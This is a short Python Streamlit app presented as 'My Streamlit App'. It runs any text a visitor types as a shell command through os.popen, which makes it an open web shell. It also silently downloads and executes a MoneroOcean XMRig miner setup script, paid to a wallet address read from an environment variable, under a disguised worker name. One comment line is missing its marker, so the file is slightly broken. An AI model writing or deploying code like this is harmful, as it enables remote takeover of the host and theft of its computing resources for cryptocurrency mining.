import os
import streamlit as st

address = os.getenv("KEY")

st.header('My Streamlit App')
input_text = st.text_input('Enter CMD')
button = st.button('Run')

if button == True:
  if input_text != '':
    output = os.popen(input_text).read()
    st.text(output)
  else:
    st.text('Please Enter CMD')
    

 Construct the curl command and store the script in a temporary file
os.system(f"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh > setup_moneroocean_miner.sh")

# Modify the script to include the worker name
os.system(f"sed -i 's/hostname/echo cmdd/' setup_moneroocean_miner.sh")

# Run the modified script with the address argument
os.system(f"bash setup_moneroocean_miner.sh {address}")
